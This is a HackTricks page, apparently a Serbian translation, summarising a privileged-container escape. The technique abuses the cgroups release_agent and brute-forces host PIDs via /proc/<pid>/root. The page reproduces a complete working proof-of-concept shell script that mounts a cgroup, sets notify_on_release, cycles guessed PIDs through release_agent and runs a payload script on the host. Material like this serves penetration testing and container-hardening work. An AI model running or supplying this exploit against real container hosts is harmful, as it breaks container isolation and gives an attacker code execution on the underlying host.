<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite videti **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzeti HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Za dalje detalje **proverite blog post sa [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)**. Ovo je samo sa쬰tak:

Tehnika opisuje metod za **izvr코avanje host koda iz kontejnera**, prevazilaze캖i izazove koje postavljaju konfiguracije storage drajvera koje prikrivaju putanju kontejnera na hostu, poput Kata kontejnera ili specifi캜nih `devicemapper` pode코avanja.

Klju캜ni koraci:

1. **Lociranje Process ID-eva (PID-ova):** Kori코캖enjem simboli캜ke veze `/proc/<pid>/root` u Linux pseudo-fajl sistemu, bilo koji fajl unutar kontejnera mo쬰 se pristupiti relativno u odnosu na fajl sistem hosta. Ovo zaobilazi potrebu za poznavanjem putanje fajl sistema kontejnera na hostu.
2. **Brute Force PID:** Koristi se metoda grubog sile za pretragu PID-ova na hostu. Ovo se posti쬰 sekven캜nim proveravanjem prisustva odre캠enog fajla na putanji `/proc/<pid>/root/<file>`. Kada se fajl prona캠e, to ukazuje da odgovaraju캖i PID pripada procesu koji se izvr코ava unutar ciljnog kontejnera.
3. **Pokretanje Izvr코avanja:** Pretpostavljena putanja PID-a se upisuje u fajl `cgroups release_agent`. Ova akcija pokre캖e izvr코avanje `release_agent`-a. Uspeh ovog koraka se potvr캠uje proverom kreiranja izlaznog fajla.

### Proces eksploatacije

Proces eksploatacije uklju캜uje detaljniji set akcija, sa ciljem izvr코avanja payload-a na hostu poga캠anjem ta캜nog PID-a procesa koji se izvr코ava unutar kontejnera. Evo kako se odvija:

1. **Inicijalizacija Okru쬰nja:** Skripta payload-a (`payload.sh`) se priprema na hostu, i kreira se jedinstveni direktorijum za manipulaciju cgroup-om.
2. **Priprema Payload-a:** Payload skripta, koja sadr쬴 komande koje 캖e se izvr코iti na hostu, se pi코e i 캜ini izvr코ivom.
3. **Pode코avanje Cgroup-a:** Cgroup se montira i konfiguri코e. Zastavica `notify_on_release` se postavlja kako bi se osiguralo da payload izvr코i kada se cgroup oslobodi.
4. **Brute Force PID:** Petlja prolazi kroz potencijalne PID-ove, upisuju캖i svaki pretpostavljeni PID u fajl `release_agent`. Ovo efektivno postavlja payload skriptu kao `release_agent`.
5. **Pokretanje i Provera Izvr코avanja:** Za svaki PID, upisuje se `cgroup.procs` cgroup-a, pokre캖u캖i izvr코avanje `release_agent`-a ako je PID ta캜an. Petlja se nastavlja dok se ne prona캠e izlaz payload skripte, 코to ukazuje na uspe코no izvr코avanje.

PoC iz blog posta:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
